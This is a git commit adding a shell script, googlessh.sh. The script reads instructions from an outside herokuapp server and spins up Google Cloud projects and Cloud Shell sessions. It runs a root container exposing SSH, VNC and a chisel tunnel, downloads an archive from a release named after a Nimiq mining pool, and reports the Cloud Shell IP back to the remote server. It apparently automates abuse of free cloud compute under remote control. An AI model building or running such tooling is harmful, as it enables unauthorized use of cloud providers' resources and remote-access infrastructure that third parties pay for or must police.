ca18eafc50585f1affb9009563e2c3cf9d04e7bd
Vinh Huynh <caubequay00@gmail.com>
2019-11-26 13:37:57 +0700

    Create googlessh.sh

---
+++ googlessh.sh
@@ -0,0 +1,24 @@
+
+url="http://jsonserver01.herokuapp.com/temp/"$1
+mail=$(curl $url | jq -r '.mail')
+isStart=$(curl $url | jq -r '.isStart')
+xproject=$(curl $url | jq -r '.project')
+ip=$(curl $url | jq -r '.ip')
+ispresent=$(gcloud projects list | grep xproject)
+if [ -z "$ispresent" ]
+then
+	xproject=project$RANDOM
+	gcloud projects create $xproject
+fi
+curl -k -s -o /dev/null -w '%{http_code}' -i -H "Accept: application/json" -H "Content-Type:application/json" -X PUT --data "{\"mail\":\"$mail \",\"isStart\":\"False\",\"project\":\"$xproject\",\"ip\":\"$ip\"}" $url
+docker run -d -e NAME=xgoogle1 -p 6902:6902 -p 8888:22 -p 8080:8080 -e PORT=6902 -e SYNC=true --user 0 caubequay00/ubuntu-novnc-chisel
+
+
+
+wget https://github.com/Vinhuit/azurenimpool/releases/download/NimiqFullBlock13_2_2019/ssh.tar.gz
+tar xvzf ssh.tar.gz
+gcloud config set project $xproject
+gcloud services enable cloudshell.googleapis.com
+gcloud alpha cloud-shell ssh
+
+echo $(curl -k -s -o /dev/null -w '%{http_code}' -i -H "Accept: application/json" -H "Content-Type:application/json" -X PUT --data "{\"mail\":\"$mail \",\"isStart\":\"True\",\"project\":\"$xproject\",\"ip\":\"$DEVSHELL_IP_ADDRESS\"}" $url)
